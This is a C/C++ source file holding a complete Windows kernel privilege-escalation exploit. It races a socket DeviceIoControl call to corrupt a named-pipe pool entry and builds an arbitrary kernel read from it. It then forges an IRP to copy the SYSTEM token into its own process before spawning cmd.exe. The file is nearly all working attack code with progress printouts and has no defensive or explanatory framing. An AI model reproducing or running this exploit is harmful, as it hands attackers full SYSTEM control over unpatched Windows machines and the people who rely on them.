#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <winternl.h>
#include <Psapi.h>

#pragma comment(lib, "Ws2_32.lib")

#pragma warning(disable:4996) 
#include <sphelper.h>
#pragma warning(default: 4996)

#include <iostream>

#define NP_HEADER_SIZE 0x30
//NTSTATUS Codes Defined
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

//Define IO_COMPLETION_OBJECT
#define IO_COMPLETION_OBJECT 1

//Maximum File Length
#define MAXIMUM_FILENAME_LENGTH 255 



//IRP constants
#define IRP_BUFFERED_IO                 0x00000010
#define IRP_DEALLOCATE_BUFFER           0x00000020
#define IRP_INPUT_OPERATION             0x00000040

#define EPROCESS_OFFSET 0x318 //0x430

typedef struct {
	HANDLE Read;
	HANDLE Write;
} PIPE_HANDLES;

typedef void (IO_APC_ROUTINE)(
	void* ApcContext,
	IO_STATUS_BLOCK* IoStatusBlock,
	unsigned long    reserved
	);

typedef int(__stdcall* NTFSCONTROLFILE)(
	HANDLE           fileHandle,
	HANDLE           event,
	IO_APC_ROUTINE* apcRoutine,
	void* ApcContext,
	IO_STATUS_BLOCK* ioStatusBlock,
	unsigned long    FsControlCode,
	void* InputBuffer,
	unsigned long    InputBufferLength,
	void* OutputBuffer,
	unsigned long    OutputBufferLength
	);

PIPE_HANDLES PipeArrayB[10000];//PipeArrayA_2


PIPE_HANDLES PIPEhandles = { 0 };


#define POOL_HEADER_SIZE 0x10
#define NP_HEADER_SIZE 0x30
#define FIRST_ENTRY_SIZE (0x2000-NP_HEADER_SIZE) //FIRST_ENTRY is not very important
#define SECOND_ENTRY_SIZE (0x4000-NP_HEADER_SIZE)
#define THIRD_ENTRY_SIZE (0x1000-NP_HEADER_SIZE)
#define ARBITRARY_WRITE_SIZE 8
#define LEAKED_DATA_OFFSET 0xb0

#define USER_DATA_ENTRY_ADDR ((uint64_t)THIRD_ENTRY_SIZE<<16)
#define DATA_ENTRY_SIZE 0x60



#define PID_OFFSET 0x440
#define ACTIVELINKS_OFFSET 0x448
#define EPROCESS_TOKEN_OFFSET 0x4b8

typedef struct LIST_ENTRY64lmao {
	uint64_t Flink;
	uint64_t Blink;
} LIST_ENTRY64lmao;

typedef struct {
	SHORT Type;
	USHORT Size;
	uint64_t MdlAddress;
	ULONG Flags;
	uint64_t AssociatedIrp;
	LIST_ENTRY64lmao ThreadListEntry;
	IO_STATUS_BLOCK IoStatus;
	CHAR RequestorMode;
	BOOLEAN PendingReturned;
	CHAR StackCount;
	CHAR CurrentLocation;
	BOOLEAN Cancel;
	UCHAR CancelIrql;
	CCHAR ApcEnvironment;
	UCHAR AllocationFlags;
	uint64_t UserIosb;
	uint64_t UserEvent;
	char Overlay[16];
	uint64_t CancelRoutine;
	uint64_t UserBuffer;
	CHAR TailIsWrong;
} IRP;

typedef struct {
	uint64_t Flink;
	uint64_t Blink;
	uint64_t Irp;
	uint64_t SecurityContext;
	uint32_t EntryType;
	uint32_t QuotaInEntry;
	uint32_t DataSize;
	uint32_t x;
} DATA_QUEUE_ENTRY;

void SprayNonPagedNXPool() {
	
	BOOL res = 0;

	UCHAR payload[0x30];
	memset(payload, 0x41, 0x30);

	UINT i = 0;
	DWORD resultLength = 0;

	printf("[+] Spray NonPaged NX Pool\n");
	for (i = 0; i < 10000; i++) {

		PipeArrayB[i].Write = CreateNamedPipe(
			L"\\\\.\\pipe\\lmaolmaolmao",
			PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
			PIPE_TYPE_BYTE | PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES,
			0x30,
			0x30,
			0,
			0);
		
		PipeArrayB[i].Read = CreateFile(
			L"\\\\.\\pipe\\lmaolmaolmao",
			GENERIC_READ,
			0,
			NULL,
			OPEN_EXISTING,
			0,
			0);

		res = WriteFile(PipeArrayB[i].Write, payload, 0x30, &resultLength, NULL);
		if (res == 0) {
			printf("[-] WriteFile failed\n");
			return;
		}
	}
}

void CreateHoles() {

	UINT i = 0;

	DWORD readBytes = 0;

	for (i = 0; i < 10000; i+= 4) {
		if (!CloseHandle(PipeArrayB[i].Read) && !CloseHandle(PipeArrayB[i].Write)) {
			printf("[-] CloseHandle failed\n");
			return;
		}
	}

	printf("[+] Create Holes success\n");
}
int flag = 0;
PIPE_HANDLES DetectPipe()
{
	BOOL res = 0;
	UCHAR payload[0x30]; //0x60 blocks
	memset(payload, 0x44, sizeof(payload));
	DWORD resultLength = 0;
	DWORD magic = 0x45464748;
	DWORD extract = 0x0;
	L1:
	for (int i = 0; i < 10000; i++) //iterate through all the
	{
		if (i % 4 == 0)
			continue;
		res = PeekNamedPipe(PipeArrayB[i].Read, payload, 0x30, &resultLength, 0, 0);

		extract = *(DWORD*)(payload);
		if (extract == magic)
		{
			printf("[+] Corrupted DATA_QUEUE_ENTRY found: %d\n", i);
			return PipeArrayB[i];
		}

		if (!res)
		{
			printf("[-] error reading in pipe\n");
			return { 0 };
		}
	}
	goto L1;
	return { 0 };
}


DWORD WINAPI Thread2(LPVOID lpParam) {
	while (1) {
		*(DWORD*)(0x1000f04) = 0x58;
		for (int i = 0; i < 500; i++);
		*(DWORD*)(0x1000f04) = 0xfffffff8;
	}
}
SOCKET s;

DWORD WINAPI Thread1(LPVOID lpParam) {
	WSADATA WSAData;
	SOCKADDR_IN sa;
	int ierr;

	WSAStartup(0x2, &WSAData);
	s = socket(AF_INET, SOCK_DGRAM, 0);
	memset(&sa, 0, sizeof(sa));
	sa.sin_port = htons(135);
	sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	sa.sin_family = AF_INET;
	ierr = bind(s, (SOCKADDR*)&sa, sizeof(sa));



	char outBuf[100];
	DWORD bytesRet;
	DWORD inbuf1[100];

	
	//build a Unbuffured DATA_QUEUE_ENTRY object placed in userland (USER_DATA_ENTRY_ADDR) to perform the arbitrary read.
	uint64_t read_address = 0;
	memset((void*)0x1000f10, 0x41, 0x60);

	DATA_QUEUE_ENTRY dqe = { 0 };
	dqe.Flink = USER_DATA_ENTRY_ADDR;
	dqe.Blink = USER_DATA_ENTRY_ADDR;
	dqe.EntryType = 0x0; //NO IRP
	dqe.QuotaInEntry = sizeof(DATA_QUEUE_ENTRY) + 0x60 + 0x20;
	dqe.DataSize = sizeof(DATA_QUEUE_ENTRY) + 0x60 + 0x20;

	memcpy((void *)0x1000f70, &dqe, sizeof(DATA_QUEUE_ENTRY));

	*(ULONGLONG*)(0x1000f70 + 0x30) = (ULONGLONG)((ULONGLONG)0x4142434445464748); //magic sequence = 0x4142434445464748
	*(ULONGLONG*)(0x1000f70 + 0x38) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
	*(ULONGLONG*)(0x1000f70 + 0x40) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
	*(ULONGLONG*)(0x1000f70 + 0x48) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
	*(ULONGLONG*)(0x1000f70 + 0x50) = (ULONGLONG)((ULONGLONG)0x4142434445464748);





	HANDLE hThread2 = CreateThread(NULL, 0, Thread2, NULL, 0, NULL);

	while (flag == 0) {
		memset(inbuf1, 0, sizeof(inbuf1));
		*(DWORD*)(0x1000f04) = 0x58;
		inbuf1[0] = 16;
		inbuf1[1] = 0x1;
		inbuf1[2] = 0x0;
		inbuf1[0x1c / 4] = 0x1;
		inbuf1[0x20 / 4] = 0x1;
		inbuf1[0x18 / 4] = 0x1;
		inbuf1[6] = 0x1000f04;
		inbuf1[7] = 0x58;


		DeviceIoControl((HANDLE)s, 0x120D3, (LPVOID)inbuf1, 0x30, outBuf, 0, &bytesRet, NULL);
	}
	TerminateThread(hThread2, 0);
	return 0;
}


void LeakMem(HANDLE victimPIPE, uint64_t addr, size_t len, char* data) {
	static char* buf = (char*)malloc(len + 0x1 + LEAKED_DATA_OFFSET);
	DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;
	DWORD read;

	IRP* irp = (IRP*)(USER_DATA_ENTRY_ADDR + 0x1000);
	memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
	dqe->EntryType = 1;
	dqe->DataSize = -1;
	dqe->Irp = (uint64_t)irp;
	irp->AssociatedIrp = addr;

	PeekNamedPipe(victimPIPE, buf, len + LEAKED_DATA_OFFSET, &read, 0, 0);

	memcpy(data, buf, len + LEAKED_DATA_OFFSET);
	memset(buf, 0x00, len + LEAKED_DATA_OFFSET); //init
}

void PrepareForWrite(uint64_t Irp, uint64_t flink) {
	DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;
	memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
	dqe->Flink = (uint64_t)flink;
	dqe->Blink = (uint64_t)flink;
	dqe->EntryType = 0x0;
	dqe->QuotaInEntry = 7;
	dqe->DataSize = 8;
	dqe->Irp = (uint64_t)Irp;
}

void findCCB(uint64_t* overwrittenQueueDataEntryCCB, uint64_t ccbAddr, uint64_t current_chunk_addr)
{
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	bool CcbFound = false;
	uint64_t ccbAddrTmp = 0;
	uint64_t NextCcb = 0;
	uint64_t ccbAddrDataEntryPtr = 0;
	ccbAddrTmp = ccbAddr + 0x18; //flink = ccbAddr + 0x18; blink = ccbAddr + 0x20
	int iter = 0;

	while (!CcbFound)
	{
		iter++;
		LeakMem(PIPEhandles.Read, ccbAddrTmp, 0x8, data); //extract the next CCB address (Flink of LIST_ENTRY)
		NextCcb = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, NextCcb + 0x90, 0x8, data); //extract DATA_QUEUE_ENTRY pointer in the CCB object
		ccbAddrDataEntryPtr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (ccbAddrDataEntryPtr == current_chunk_addr) //if the DATA_QUEUE_ENTRY pointed by the CCB object is the previously calculated overwritten DATA_QUEUE_ENTRY chunk address, we found the CCB related to the overwritten DATA_QUEUE_ENTRY
		{
			CcbFound = true;
			*overwrittenQueueDataEntryCCB = NextCcb;
		}

		ccbAddrTmp = NextCcb;

		if (iter > 500000)
			break;

	}
}



void findIrpAddres(uint64_t* IrpAddr, uint64_t ccbAddr, uint64_t previousIRP)
{
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	bool IrpFOund = false;
	uint64_t ccbAddrTmp = 0;
	uint64_t NextCcb = 0;
	ccbAddrTmp = ccbAddr + 0x18; //flink = ccbAddr + 0x18; blink = ccbAddr + 0x20
	uint32_t iter = 0;

	while (!IrpFOund)
	{
		iter++;
		LeakMem(PIPEhandles.Read, ccbAddrTmp, 0x8, data); //extract the next CCB address (Flink of LIST_ENTRY)
		NextCcb = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, NextCcb - 0x18 + 0xe8, 0x8, data); //extract DATA_QUEUE_ENTRY pointer in the CCB object
		*IrpAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (*IrpAddr != NULL && *IrpAddr != previousIRP) //if the DATA_QUEUE_ENTRY pointed by the CCB object is the previously calculated overwritten DATA_QUEUE_ENTRY chunk address, we found the CCB related to the overwritten DATA_QUEUE_ENTRY
		{
			IrpFOund = true;
		}

		ccbAddrTmp = NextCcb;

		if (iter > 500000)
			break;

	}
}



uint64_t GetProcessById(HANDLE handle, uint64_t first_process, uint64_t pid) {
	uint64_t current_pid = 0;
	uint64_t current_process = first_process;
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	while (1) {
		LeakMem(PIPEhandles.Read, (uint64_t)current_process + PID_OFFSET, 0x8, data);
		current_pid = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (current_pid == pid)
			return current_process;

		LeakMem(PIPEhandles.Read, (uint64_t)current_process + ACTIVELINKS_OFFSET, 0x8, data);
		current_process = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		current_process -= PID_OFFSET + 0x8;

		if (current_process == first_process)
			return 0;
	}
}

void BuildFakeIRP(uint64_t irp, uint64_t thread_list, uint64_t source_address, uint64_t destination_address) {
	*(uint64_t*)(irp + 0x10) = 0x60850;
	*(uint64_t*)(irp + 0x18) = (uint64_t)source_address;
	*(uint64_t*)(irp + 0x70) = (uint64_t)destination_address;
	*(uint64_t*)(irp + 0x20) = (uint64_t)(thread_list);
	*(uint64_t*)(irp + 0x28) = (uint64_t)(thread_list);
}

void foundIrpInDataEntry(uint64_t* IrpAddr, uint64_t ccbAddr, uint64_t previousIRP)
{
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	bool CcbFound = false;
	uint64_t ccbAddrTmp = 0;
	uint64_t NextCcb = 0;
	uint64_t ccbAddrDataEntryPtr = 0;
	ccbAddrTmp = ccbAddr + 0x18; //flink = ccbAddr + 0x18; blink = ccbAddr + 0x20
	int iter = 0;

	while (!CcbFound)
	{
		iter++;
		LeakMem(PIPEhandles.Read, ccbAddrTmp, 0x8, data); //extract the next CCB address (Flink of LIST_ENTRY)
		NextCcb = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, NextCcb + 0x90, 0x8, data); //extract first DATA_QUEUE_ENTRY pointer in the CCB object
		ccbAddrDataEntryPtr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, ccbAddrDataEntryPtr + 0x10, 0x8, data); //extract IRP related offset of DATA_QUEUE_ENTRY object
		*IrpAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (*IrpAddr != NULL && *IrpAddr != previousIRP && *IrpAddr > 0x7fffffff)
		{
			CcbFound = true;
		}

		LeakMem(PIPEhandles.Read, NextCcb + 0x98, 0x8, data); //extract second DATA_QUEUE_ENTRY pointer in the CCB object
		ccbAddrDataEntryPtr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, ccbAddrDataEntryPtr + 0x10, 0x8, data); //extract IRP related offset of DATA_QUEUE_ENTRY object
		*IrpAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (*IrpAddr != NULL && *IrpAddr != previousIRP && *IrpAddr > 0x7fffffff)
		{
			CcbFound = true;
		}
		ccbAddrTmp = NextCcb;

		if (iter > 500000)
			break;

	}
}

int main() {
	VirtualAlloc((LPVOID)0x1000000, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (VirtualAlloc((PVOID)USER_DATA_ENTRY_ADDR, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != (PVOID)USER_DATA_ENTRY_ADDR) {
		printf("Couldn't allocate base address %p\n", USER_DATA_ENTRY_ADDR);
		return 0;
	}
	PVOID UserAddr = VirtualAlloc(NULL, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (UserAddr)
	{
		memset(UserAddr, 0x52, 0x5000);
	}

	uint64_t read_address = 0;

	//build a Unbuffured DATA_QUEUE_ENTRY object placed in userland (USER_DATA_ENTRY_ADDR) to perform the arbitrary read.

	DATA_QUEUE_ENTRY UnbufferedDqe = { 0 };

	UnbufferedDqe.EntryType = 1;
	UnbufferedDqe.DataSize = -1;
	IRP irp = { 0 };
	UnbufferedDqe.Irp = (uint64_t) & irp; //unbuffered DATA_QUEUE_ENTRY uses IRP to extend the storage capability
	irp.AssociatedIrp = read_address;  //this is the addressthat is used in te arbitrary read

	memcpy((PVOID)USER_DATA_ENTRY_ADDR, &UnbufferedDqe, sizeof(DATA_QUEUE_ENTRY));


	SprayNonPagedNXPool();
	CreateHoles();
	HANDLE hThread1 = CreateThread(NULL, 0, Thread1, NULL, 0, NULL);
	// wait for thread 1 to finish
	PIPEhandles = DetectPipe();
	flag = 1;

	// stop thread 1 and thread 2
	char data[0x1000];
	DWORD read;

	LeakMem(PIPEhandles.Read, (uint64_t)UserAddr, 0xF58, data);
	//cleanUp
	DWORD zero = 0;
	uint64_t cleanUpEntryTipe = USER_DATA_ENTRY_ADDR + 0x20;
	memcpy((PVOID)(USER_DATA_ENTRY_ADDR + 0x20), &zero, sizeof(zero));
	uint64_t next_chunk_flink = *(ULONGLONG*)(data + 0x40);
	printf("[+] Leaked Flink of next chunk: 0x%llx\n", next_chunk_flink);

	//extract next_chunk_flink content
	LeakMem(PIPEhandles.Read, next_chunk_flink+8, 0x30, data);
	uint64_t next_chunk_addr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);

	printf("[+] Address of next chunk: 0x%llx\n", next_chunk_addr);
	uint64_t current_chunk_addr = next_chunk_addr - DATA_ENTRY_SIZE - POOL_HEADER_SIZE;

	printf("[+] Address of current chunk: 0x%llx\n", current_chunk_addr);

	uint64_t ccbAddr = (uint64_t)next_chunk_flink - 0xa8;

	printf("[+] Address of CCB: 0x%llx\n", ccbAddr);

	uint64_t current_chunk_flink = 0;
	uint64_t current_chunk_blink = 0;
	uint64_t PotentialBlink = 0;
	uint64_t flink = (uint64_t)next_chunk_flink;

	//try to recover the overwritten flink and blink in DATA_QUEUE_ENTRY object. Without this the kernel crash because the corrupted entry in LIST_ENTRY
	//For this, we need to follow the LIST_ENTRY of the CCB object and inspect the content. If the CCB+0xa8 content = current_chunk_address, we have the corrupted CCB
	//and we can recover  the overwritten flink and blink of the lost DATA_QUEUE_ENTRY

	uint64_t overwrittenQueueDataEntryCCB = 0;
	findCCB(&overwrittenQueueDataEntryCCB, ccbAddr, current_chunk_addr);
	printf("[+] Address of overwritten CCB: 0x%llx\n", overwrittenQueueDataEntryCCB);



	BYTE readBuf[0x30 + 8];
	DWORD numBytes = 0;
	NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtFsControlFile");
	IO_STATUS_BLOCK isb;
	char irp_data[0x1000];
	memset(irp_data, 0x77, 0x1000);

	PIPE_HANDLES pipeHandle2{ 0 };

	//Create an unbuffered QUEUE DAYA ENTRY with an IRP pointer that is copied with the CCB structure related to the connection created in NtFsControlFile 0x119ff8 call
	//this happens in NpAddDataQueueEntry

	pipeHandle2.Write = CreateNamedPipe(
		L"\\\\.\\pipe\\lmaolmaolmao",
		PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_BYTE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		0x30,
		0x30,
		0,
		0);
	pipeHandle2.Read = CreateFile(L"\\\\.\\pipe\\lmaolmaolmao", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);


	//Create unbufferentru
	NtFsControlFile(pipeHandle2.Write, 0, 0, 0, &isb, 0x119FF8, irp_data, DATA_ENTRY_SIZE, 0, 0);

	//now i used the same method used to recover the overwritten flink and blink of the original DATA QUEUE ENTRY.
	//this time i iterate through all the CCB LIST_ENTRY until i found the CCB created in the previous call (offset 0xe8 should not be NULL)
	uint64_t IrpAddr = 0;
	findIrpAddres(&IrpAddr, ccbAddr, NULL);
	printf("[+] IRP found! Address of IRP: 0x%llx\n", IrpAddr);

	//Now i read all the IRP structure content
	char irp_leaked_data[sizeof(IRP) + 0x200];
	
	LeakMem(PIPEhandles.Read, IrpAddr, sizeof(IRP) + 0x200, data);
	memcpy(irp_leaked_data, (uint64_t*)(data + LEAKED_DATA_OFFSET), sizeof(IRP) + 0x200);
	IRP* irp_object = (IRP*)irp_leaked_data;


	//leak eprocess data

	//Read ThreadListHead pointer from IRP->ThreadListEntry.Flink+0x38
	uint64_t thread_list_head = 0;
	uint64_t current_process = 0;
	uint64_t system_process = 0;
	uint64_t current_process_id = 0;
	uint64_t system_token = 0;



	LeakMem(PIPEhandles.Read, (uint64_t)irp_object->ThreadListEntry.Flink + 0x38, 0x8, data);
	thread_list_head = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
	printf("[+] thread_list_head address: 0x%llx\n", thread_list_head);

	//extract current process locate in cp_thread_list_head-0x2c8
	LeakMem(PIPEhandles.Read, (uint64_t)(thread_list_head - EPROCESS_OFFSET), 0x8, data);
	current_process = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
	printf("[+] current_process address: 0x%llx\n", current_process);

	LeakMem(PIPEhandles.Read, (uint64_t)current_process + PID_OFFSET, 0x8, data);
	current_process_id = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
	printf("[+] PID found: %lld\n", current_process_id);

	if (current_process_id != GetCurrentProcessId())
	{
		printf("[-] Not valid PID found");
	}

	//find SYSTEM process
	system_process = GetProcessById(PIPEhandles.Read, current_process, 4);
	printf("[+] system_process address: 0x%llx\n", system_process);


	//Extract system token - EPROCESS_TOKEN_OFFSET
	//Prepare IRP
	BYTE sourceAddr[0x20];
	memset(sourceAddr, 0x81, 0x20);
	uint64_t thread_list[2];
	BuildFakeIRP((uint64_t)irp_object, (uint64_t)thread_list, (uint64_t)(system_process + EPROCESS_TOKEN_OFFSET), (uint64_t)(current_process + EPROCESS_TOKEN_OFFSET));

	//allocate forged IRP in unbuffered data entry

	PIPE_HANDLES pipeHandle3{ 0 };
	pipeHandle3.Write = CreateNamedPipe(
		L"\\\\.\\pipe\\lmaolmaolmao",
		PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_BYTE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		0x30,
		0x30,
		0,
		0);
	pipeHandle3.Read = CreateFile(L"\\\\.\\pipe\\lmaolmaolmao", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

	//Create unbufferentry
	NtFsControlFile(pipeHandle3.Write, 0, 0, 0, &isb, 0x119FF8, irp_object, sizeof(IRP) + 0x200, 0, 0);

	uint64_t FakeIrpAddr = 0;
	//search kernel address of IRP created during NtFsControlFile 0x119FF8 call
	foundIrpInDataEntry(&FakeIrpAddr, ccbAddr, IrpAddr);
	printf("[+] IRP found! Address of IRP: 0x%llx\n", FakeIrpAddr);

	uint64_t IrpSystemAddr = 0;
	LeakMem(PIPEhandles.Read, FakeIrpAddr + 0x18, 0x8, data); //extract SystemAddress from IRP
	//systemAdress points to irp_object injected in NtFsControlFile
	IrpSystemAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
	printf("[+] Address of IrpSystemAddr: 0x%llx\n", IrpSystemAddr);

	//PrepareDataEntryForWrite(&dqe, (IRP*)IrpSystemAddr, ARBITRARY_WRITE_SIZE);

	printf("[+] Triggering a call to IofCompleteRequest with our forged IRP and overwriting our token\n\n");
	
	PrepareForWrite((uint64_t)IrpSystemAddr,(uint64_t)current_chunk_addr);
	thread_list[0] = thread_list[1] = (uint64_t)(IrpSystemAddr + offsetof(IRP, ThreadListEntry.Flink));


	DWORD BytesReturned = 0;
	BYTE bufRead[0x80];
	ReadFile(PIPEhandles.Read, bufRead, 1, &BytesReturned, 0);




	Sleep(2000);

	system("cmd.exe");

}

